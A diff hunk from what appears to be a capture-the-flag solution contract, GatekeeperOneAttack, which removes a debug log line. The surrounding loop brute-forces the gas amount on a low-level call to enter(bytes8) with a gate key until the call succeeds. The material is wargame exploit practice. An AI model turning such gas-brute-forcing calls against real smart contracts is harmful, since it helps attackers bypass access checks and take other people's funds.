@@ -104,7 +104,6 @@ contract GatekeeperOneAttack {
         for (uint256 i = 0; i < 300; i++) {
             (bool success, ) = address(target).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
             if (success) {
-                console.log(i);
                 break;
             }
         }
